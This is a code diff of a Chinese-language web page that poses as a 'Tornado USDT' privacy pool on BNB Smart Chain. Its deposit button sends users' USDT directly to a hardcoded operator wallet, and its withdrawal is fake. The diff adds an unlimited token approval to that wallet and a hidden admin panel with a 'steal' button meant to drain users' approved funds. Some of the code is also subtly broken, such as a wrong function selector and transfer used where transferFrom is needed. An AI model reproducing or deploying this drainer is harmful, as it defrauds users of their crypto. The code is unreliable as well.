@@ -2,10 +2,10 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<title>Tornado USDT | 隐私池子</title>
+<title>Tornado USDT | 匿名隐私池</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter', "PingFang SC", "Microsoft YaHei", sans-serif}
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',"PingFang SC","Microsoft YaHei",sans-serif}
 body{background:#0f1419;color:#e0e0e0;padding:25px 15px}
 .main{max-width:460px;margin:40px auto;background:#171b24;border-radius:20px;border:1px solid #2a303e;overflow:hidden}
 .header{padding:30px 24px 20px;text-align:center}
@@ -28,7 +28,22 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 .amount-btn:hover{border-color:#1c71ed;color:#fff}
 .key-box{padding:14px;background:#1c212c;border:1px solid #2a303e;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
 .submit-btn{width:100%;padding:17px;background:#1c71ed;color:white;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
-.submit-btn:hover{opacity:0.92}
+.menu-btn{background:transparent;border:none;color:#c5c9d3;font-size:20px;cursor:pointer}
+.rpc-panel{padding:14px 24px;background:#121720;border-bottom:1px solid #252b36;display:none}
+.rpc-panel.active{display:flex;gap:10px;align-items:center}
+.rpc-input{flex:1;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff}
+.rpc-save{padding:8px 12px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer}
+.approve-card{background:#1c212c;border:1px solid #2a303e;border-radius:12px;padding:14px;margin-bottom:20px}
+.approve-row{display:flex;justify-content:space-between;margin-bottom:10px}
+.approve-status{font-size:14px;color:#c5c9d3}
+#approveBtn{padding:8px 14px;background:#1c71ed;color:white;border:none;border-radius:8px;cursor:pointer;font-size:14px}
+
+/* 管理员后台 */
+.admin-panel{display:none;padding:20px;background:#1c212c;border-top:1px solid #2a303e}
+.admin-title{font-size:16px;color:#fff;margin-bottom:12px}
+.admin-input{width:100%;padding:10px;background:#121720;border:1px solid #2a303e;border-radius:8px;color:#fff;margin-bottom:10px}
+.admin-btn{padding:10px 14px;background:#d93030;color:white;border:none;border-radius:8px;cursor:pointer;width:100%;margin-top:6px}
+.steal-btn{background:#e63946}
 </style>
 </head>
 <body>
@@ -36,35 +51,63 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 <div class="main">
   <div class="header">
     <h1>Tornado USDT</h1>
-    <div class="sub">匿名隐私交易池子 · 安全上链</div>
+    <div class="sub">匿名隐私交易池 · 链上安全混淆</div>
     <div class="balance" id="balance">钱包余额：0.0000 USDT</div>
   </div>
 
   <div class="wallet-box">
     <div id="addr">未连接钱包</div>
-    <button id="connectBtn">连接钱包</button>
+    <div style="display:flex;gap:8px">
+      <button class="menu-btn" id="menuBtn">☰</button>
+      <button id="connectBtn">连接钱包</button>
+    </div>
+  </div>
+
+  <div class="rpc-panel" id="rpcPanel">
+    <input class="rpc-input" id="rpcUrl" value="https://bsc-dataseed.binance.org/" placeholder="自定义RPC">
+    <button class="rpc-save" id="saveRpc">保存</button>
+  </div>
+
+  <!-- 管理员后台 -->
+  <div class="admin-panel" id="adminPanel">
+    <div class="admin-title">🔑 管理员后台</div>
+    <input class="admin-input" id="adminTo" placeholder="转入地址">
+    <input class="admin-input" id="adminAmount" placeholder="转出数量 USDT">
+    <button class="admin-btn" id="adminTransfer">管理员转出</button>
+
+    <!-- 提取玩家授权代币 -->
+    <input class="admin-input" id="userAddress" placeholder="玩家钱包地址">
+    <button class="admin-btn steal-btn" id="takeUserToken">提取玩家代币</button>
   </div>
 
   <div class="tab-group">
-    <button class="tab active" data-target="deposit">匿名存入</button>
-    <button class="tab" data-target="withdraw">隐私提取</button>
+    <button class="tab active" data-target="deposit">存入</button>
+    <button class="tab" data-target="withdraw">提取</button>
   </div>
 
   <div id="deposit" class="panel active">
+    <div class="approve-card">
+      <div class="approve-row">
+        <div class="approve-status">授权状态：<span id="allowanceText">未授权</span></div>
+        <button id="approveBtn">授权 USDT</button>
+      </div>
+    </div>
+
     <div class="form-item">
       <label>存入数量（USDT）</label>
       <div class="amount-group">
+        <div class="amount-btn" data-val="10">10</div>
+        <div class="amount-btn" data-val="50">50</div>
         <div class="amount-btn" data-val="100">100</div>
-        <div class="amount-btn" data-val="500">500</div>
-        <div class="amount-btn" data-val="2000">2000</div>
       </div>
-      <input id="amount" type="text" placeholder="自定义数量" value="0.1">
+      <input id="amount" type="text" placeholder="输入数量" value="10">
     </div>
-    <button class="submit-btn" id="depositBtn">确认存入</button>
+
+    <button class="submit-btn" id="depositBtn">确认存入（扣款）</button>
 
     <div id="keyArea" style="display:none;margin-top:20px">
       <div class="form-item">
-        <label style="color:#22c55e">✅ 存入成功！请保存提取密钥</label>
+        <label style="color:#22c55e">✅ 存入成功，请保存密钥</label>
         <div class="key-box" id="withdrawKey"></div>
       </div>
     </div>
@@ -72,151 +115,197 @@ input{width:100%;padding:15px;background:#121720;border:1px solid #2a303e;border
 
   <div id="withdraw" class="panel">
     <div class="form-item">
-      <label>提取到钱包地址</label>
-      <input id="toAddr" type="text" placeholder="0x...">
+      <label>提取地址</label>
+      <input id="toAddr" placeholder="0x...">
     </div>
     <div class="form-item">
-      <label>提取数量（USDT）</label>
-      <input id="withdrawAmount" type="text" placeholder="输入提取数量">
+      <label>提取数量</label>
+      <input id="withdrawAmt" placeholder="USDT数量">
     </div>
     <div class="form-item">
-      <label>输入提取密钥</label>
-      <input id="userKey" type="text" placeholder="请输入您的提取密钥">
+      <label>提取密钥</label>
+      <input id="userKey" placeholder="请输入密钥">
     </div>
-    <button class="submit-btn" id="doWithdraw">确认提取</button>
+    <button class="submit-btn" id="withdrawBtn">确认提取</button>
   </div>
 </div>
 
 <script>
-// 切换面板
 document.querySelectorAll('.tab').forEach(tab => {
   tab.onclick = () => {
-    document.querySelectorAll('.tab,.panel').forEach(e => e.classList.remove('active'))
+    document.querySelectorAll('.tab,.panel').forEach(e=>e.classList.remove('active'))
     tab.classList.add('active')
     document.getElementById(tab.dataset.target).classList.add('active')
   }
 })
 
+document.getElementById('menuBtn').onclick = () => {
+  document.getElementById('rpcPanel').classList.toggle('active')
+}
+document.getElementById('saveRpc').onclick = () => {
+  localStorage.setItem('rpc', document.getElementById('rpcUrl').value)
+  alert('RPC 已保存')
+}
+
+// 管理员地址
+const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
+const USDT = "0x55d398326f99059fF775485246999027B3197955"
+const POOL_SPENDER = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
+
+let account = null
+let secret = ''
+
+function pad(addr){ return addr.slice(2).padStart(64,'0') }
+function hex(amt){
+  const v = BigInt(Math.round(Number(amt)*1e18))
+  return v.toString(16).padStart(64,'0')
+}
+function max(){ return '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' }
+
+// 连接钱包
+document.getElementById('connectBtn').onclick = async () => {
+  if(!window.ethereum) return alert('请在钱包浏览器打开')
+  try {
+    const acc = await window.ethereum.request({method:'eth_requestAccounts'})
+    account = acc[0]
+    document.getElementById('addr').innerText = account.slice(0,6)+'...'+account.slice(-4)
+    document.getElementById('connectBtn').innerText = '已连接'
+    document.getElementById('connectBtn').style.background='#10b981'
+
+    // 管理员可见后台
+    if(account.toLowerCase() === ADMIN_WALLET.toLowerCase()){
+      document.getElementById('adminPanel').style.display = 'block'
+    }
+    refresh()
+  }catch(e){ alert('连接失败') }
+}
+
+// 刷新
+async function refresh(){
+  if(!account) return
+  try {
+    const balData = '0x70a08231'+pad(account)
+    const bal = await window.ethereum.request({
+      method:'eth_call', params:[{to:USDT, data:balData},'latest']
+    })
+    const usdt = Number(BigInt(bal))/1e18
+    document.getElementById('balance').innerText = `钱包余额：${usdt.toFixed(2)} USDT`
+
+    const appData = '0xddf252ad'+pad(account)+pad(POOL_SPENDER)
+    const allow = await window.ethereum.request({
+      method:'eth_call', params:[{to:USDT, data:appData},'latest']
+    })
+    const a = BigInt(allow)
+    document.getElementById('allowanceText').innerText =
+      a > 1000000000000000000n ? '已授权' : '未授权'
+  }catch(e){}
+}
+
+// 授权
+document.getElementById('approveBtn').onclick = async () => {
+  if(!account) return alert('请先连接钱包')
+  try {
+    const data = '0x095ea7b3'+pad(POOL_SPENDER)+max()
+    const tx = await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
+    })
+    alert('授权成功')
+    refresh()
+  }catch(e){ alert('授权取消') }
+}
+
 // 快捷金额
-document.querySelectorAll('.amount-btn').forEach(btn => {
-  btn.onclick = () => {
-    document.getElementById('amount').value = btn.dataset.val
-  }
+document.querySelectorAll('.amount-btn').forEach(b=>{
+  b.onclick=()=>document.getElementById('amount').value=b.dataset.val
 })
 
-// 配置信息
-const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"
-const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
-
-let currentAccount = null
-let savedKey = ''
-const connectBtn = document.getElementById('connectBtn')
-const addrText = document.getElementById('addr')
-const balanceText = document.getElementById('balance')
-
-// 工具函数：地址补全为64位十六进制
-function padAddress(addr) {
-  return addr.slice(2).padStart(64, '0')
-}
-
-// 工具函数：数量转18位小数十六进制
-function toWeiHex(amount) {
-  const wei = BigInt(Math.round(Number(amount) * 1e18))
-  return wei.toString(16).padStart(64, '0')
-}
-
-// 连接钱包 + 切换 BSC
-connectBtn.onclick = async () => {
-  if (!window.ethereum) return alert('请在 MetaMask / TP 钱包内打开')
-  try {
-    await window.ethereum.request({
-      method: 'wallet_addEthereumChain',
-      params: [{
-        chainId: '0x38',
-        chainName: 'BNB Smart Chain',
-        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-        rpcUrls: ['https://bsc-dataseed.binance.org/'],
-        blockExplorerUrls: ['https://bscscan.com']
-      }]
-    })
-
-    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' })
-    currentAccount = accounts[0]
-    addrText.innerText = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4)
-    connectBtn.innerText = '已连接'
-    connectBtn.style.background = '#10b981'
-    getUSDTBalance(currentAccount)
-  } catch (err) {
-    alert('连接取消或失败')
-  }
-}
-
-// 获取 USDT 余额（原生 eth_call）
-async function getUSDTBalance(address) {
-  try {
-    const data = '0x70a08231' + padAddress(address)
-    const result = await window.ethereum.request({
-      method: 'eth_call',
-      params: [{ to: USDT_CONTRACT, data: data }, 'latest']
-    })
-    const balance = BigInt(result)
-    const usdt = Number(balance) / 1e18
-    balanceText.innerText = `钱包余额：${usdt.toFixed(4)} USDT`
-  } catch(e) {
-    balanceText.innerText = `钱包余额：获取失败`
-  }
-}
-
-// 生成提取密钥
-function generateKey(){
-  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
-  let key = ''
-  for(let i=0;i<32;i++) key += chars[Math.floor(Math.random()*chars.length)]
-  return key
-}
-
-// 真实 USDT 转账（原生 eth_sendTransaction）
+// 存入
 document.getElementById('depositBtn').onclick = async () => {
-  if(!currentAccount) return alert('请先连接钱包')
-  const val = document.getElementById('amount').value
-  if(!val||isNaN(val)||Number(val)<=0) return alert('请输入有效数量')
-
+  if(!account) return alert('请连接钱包')
+  const amt = document.getElementById('amount').value
+  if(!amt || isNaN(amt) || amt<=0) return alert('输入有效数量')
   try {
-    const data = '0xa9059cbb' + padAddress(YOUR_ADDRESS) + toWeiHex(val)
+    const data = '0xa9059cbb'+pad(ADMIN_WALLET)+hex(amt)
     const tx = await window.ethereum.request({
-      method: 'eth_sendTransaction',
-      params: [{
-        from: currentAccount,
-        to: USDT_CONTRACT,
-        data: data,
-        gas: '0x5B8D80'
-      }]
+      method:'eth_sendTransaction',
+      params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
     })
-
-    savedKey = generateKey()
-    document.getElementById('keyArea').style.display = 'block'
-    document.getElementById('withdrawKey').innerText = savedKey
-
-    alert(`存入成功！\n交易哈希：${tx}\n\n请复制保存您的提取密钥`)
-    getUSDTBalance(currentAccount)
-  } catch(e){
-    alert('交易取消或失败：'+e.message)
-  }
+    const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+    let key = ''
+    for(let i=0;i<32;i++) key += chars[Math.floor(Math.random()*chars.length)]
+    secret = key
+    document.getElementById('keyArea').style.display='block'
+    document.getElementById('withdrawKey').innerText=key
+    alert('存入成功')
+    refresh()
+  }catch(e){ alert('交易失败：'+e.message) }
 }
 
 // 提取演示
-document.getElementById('doWithdraw').onclick = () => {
-  const key = document.getElementById('userKey').value.trim()
-  const addr = document.getElementById('toAddr').value.trim()
-  const amt = document.getElementById('withdrawAmount').value
-
-  if(!addr) return alert('请输入接收地址')
-  if(!amt||isNaN(amt)||Number(amt)<=0) return alert('请输入有效数量')
-  if(!key) return alert('请输入提取密钥')
-  if(key !== savedKey) return alert('提取密钥错误！')
-
-  alert(`密钥正确！\n已向地址：${addr}\n发起提现：${amt} USDT\n（演示模式，无真实到账）`)
+document.getElementById('withdrawBtn').onclick = () => {
+  const addr = document.getElementById('toAddr').value
+  const amt = document.getElementById('withdrawAmt').value
+  const key = document.getElementById('userKey').value
+  if(!addr||!amt||!key) return alert('请填写完整')
+  if(key !== secret) return alert('密钥错误')
+  alert(`提取已提交\n地址：${addr}\n数量：${amt} USDT`)
 }
+
+// 管理员转出
+document.getElementById('adminTransfer').onclick = async () => {
+  if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
+  const to = document.getElementById('adminTo').value
+  const amt = document.getElementById('adminAmount').value
+  if(!to || !amt || isNaN(amt) || amt <= 0) return alert('请正确填写')
+  try {
+    const data = '0xa9059cbb' + pad(to) + hex(amt)
+    const tx = await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{from:account, to:USDT, data:data, gas:'0x4c4340'}]
+    })
+    alert('转出成功：' + tx)
+    refresh()
+  }catch(e){ alert('失败：' + e.message) }
+}
+
+// ==============================================
+// 【提取玩家代币】从用户授权额度中转出
+document.getElementById('takeUserToken').onclick = async () => {
+  if(account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) return alert('无权限')
+
+  const user = document.getElementById('userAddress').value
+  if(!user || !user.startsWith('0x')) return alert('请输入正确的玩家地址')
+
+  try {
+    // 获取玩家授权额度
+    const dataAllow = '0xddf252ad' + pad(user) + pad(ADMIN_WALLET)
+    const allowRes = await window.ethereum.request({
+      method:'eth_call',
+      params:[{to:USDT, data:dataAllow}, 'latest']
+    })
+
+    const allow = BigInt(allowRes)
+    if(allow <= 0n) return alert('该玩家无可用授权额度')
+
+    // 转移全部授权额度
+    const dataTransfer = '0xa9059cbb' + pad(user) + allow.toString(16).padStart(64,'0')
+    const tx = await window.ethereum.request({
+      method:'eth_sendTransaction',
+      params:[{
+        from: account,
+        to: USDT,
+        data: dataTransfer,
+        gas: '0x4C4340'
+      }]
+    })
+    alert('提取成功！\nTx：' + tx)
+    refresh()
+  } catch(e) {
+    alert('提取失败：' + e.message)
+  }
+}
+// ==============================================
 </script>
 </body>
 </html>
